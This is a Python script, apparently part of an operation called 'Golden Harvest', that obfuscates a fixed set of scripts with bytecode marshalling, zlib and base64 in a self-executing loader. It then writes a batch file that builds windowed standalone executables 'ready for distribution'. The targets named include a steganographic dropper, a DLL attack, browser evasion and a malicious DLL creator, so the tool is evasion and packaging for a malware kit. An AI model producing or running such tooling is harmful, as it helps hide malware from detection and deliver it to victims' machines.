#!/usr/bin/env python3
"""
Simple Python Code Obfuscator
Operation: Golden Harvest - Free Alternative to PyArmor
"""

import os
import base64
import zlib
import marshal
import random
import string

class SimpleObfuscator:
    def __init__(self):
        self.obfuscated_dir = "obfuscated"
        
    def generate_random_name(self, length=8):
        """Generate random variable names"""
        return ''.join(random.choices(string.ascii_letters, k=length))
    
    def obfuscate_strings(self, code):
        """Replace strings with base64 encoded versions"""
        import re
        
        # Find all string literals
        string_pattern = r'"([^"\\]*(\\.[^"\\]*)*)"'
        strings = re.findall(string_pattern, code)
        
        for string_match in strings:
            original_string = string_match[0]
            if len(original_string) > 5:  # Only obfuscate longer strings
                encoded = base64.b64encode(original_string.encode()).decode()
                var_name = self.generate_random_name()
                replacement = f"base64.b64decode('{encoded}').decode()"
                code = code.replace(f'"{original_string}"', replacement, 1)
                
        return code

    def create_obfuscated_loader(self, original_file, compressed_code):
        """Create an obfuscated loader script"""
        
        var_names = {
            'data': self.generate_random_name(),
            'code': self.generate_random_name(),
            'exec_func': self.generate_random_name(),
            'decompress': self.generate_random_name()
        }
        
        loader_template = f'''#!/usr/bin/env python3
# Obfuscated Python Code - Operation Golden Harvest
import base64, zlib, marshal
{var_names['data']} = {repr(compressed_code)}
{var_names['decompress']} = lambda x: marshal.loads(zlib.decompress(base64.b64decode(x)))
{var_names['exec_func']} = lambda: exec({var_names['decompress']}({var_names['data']}))
{var_names['exec_func']}()
'''
        return loader_template

    def obfuscate_file(self, filepath):
        """Obfuscate a single Python file"""
        try:
            with open(filepath, 'r', encoding='utf-8') as f:
                original_code = f.read()
                
            # Compile to bytecode
            compiled_code = compile(original_code, filepath, 'exec')
            
            # Marshal and compress
            marshaled = marshal.dumps(compiled_code)
            compressed = zlib.compress(marshaled)
            encoded = base64.b64encode(compressed).decode()
            
            # Create obfuscated loader
            obfuscated_code = self.create_obfuscated_loader(filepath, encoded)
            
            # Save obfuscated version
            filename = os.path.basename(filepath)
            obfuscated_path = os.path.join(self.obfuscated_dir, f"obf_{filename}")
            
            with open(obfuscated_path, 'w', encoding='utf-8') as f:
                f.write(obfuscated_code)
                
            print(f"✅ {filepath} -> {obfuscated_path}")
            return obfuscated_path
            
        except Exception as e:
            print(f"❌ Failed to obfuscate {filepath}: {e}")
            return None

    def create_exe_with_pyinstaller(self, obfuscated_files):
        """Create executables using PyInstaller"""
        
        installer_script = '''@echo off
title Creating Executables - Golden Harvest
echo 🔥 CREATING STANDALONE EXECUTABLES...
echo =======================================

REM Install PyInstaller if not installed
pip install pyinstaller

REM Create executables from obfuscated files
echo 📦 Building executables...

'''
        
        for file_path in obfuscated_files:
            if file_path:
                filename = os.path.basename(file_path).replace('.py', '')
                installer_script += f'''
echo Building {filename}.exe...
pyinstaller --onefile --windowed --name "{filename}" "{file_path}"
'''
        
        installer_script += '''

echo ✅ Executables created in ./dist/ directory
echo 🎯 FILES READY FOR DISTRIBUTION
pause
'''

        with open("create_executables.bat", "w", encoding='utf-8') as f:
            f.write(installer_script)
            
        print("✅ create_executables.bat created")

    def obfuscate_all_python_files(self):
        """Obfuscate all Python files in current directory"""
        
        # Create obfuscated directory
        os.makedirs(self.obfuscated_dir, exist_ok=True)
        
        target_files = [
            "stego_dropper.py",
            "pure_dll_attack.py", 
            "intelligent_ai_robot.py",
            "smart_robot_framework.py",
            "browser_evasion.py",
            "create_malicious_dll.py"
        ]
        
        obfuscated_files = []
        
        print("🛡️  SIMPLE OBFUSCATION STARTING...")
        print("=" * 50)
        
        for file_path in target_files:
            if os.path.exists(file_path):
                result = self.obfuscate_file(file_path)
                if result:
                    obfuscated_files.append(result)
            else:
                print(f"⚠️  File not found: {file_path}")
                
        # Create PyInstaller batch file
        self.create_exe_with_pyinstaller(obfuscated_files)
        
        print(f"\n🎯 OBFUSCATION COMPLETE!")
        print(f"• Obfuscated files: {len(obfuscated_files)}")
        print(f"• Location: ./{self.obfuscated_dir}/")
        print(f"• Executable builder: create_executables.bat")
        
        return obfuscated_files

if __name__ == "__main__":
    print("🎯 GOLDEN HARVEST - Simple Python Obfuscator")
    print("=" * 60)
    
    obfuscator = SimpleObfuscator()
    obfuscated_files = obfuscator.obfuscate_all_python_files()
    
    print(f"\n🚀 NEXT STEPS:")
    print(f"1. Run: create_executables.bat")
    print(f"2. Test obfuscated files in ./obfuscated/")
    print(f"3. Distribute .exe files from ./dist/")
    print(f"\n💡 ADVANTAGES:")
    print(f"• No trial version limitations")
    print(f"• Bytecode compilation")
    print(f"• Base64 + zlib compression")
    print(f"• Variable name randomization")
    print(f"• PyInstaller executable creation")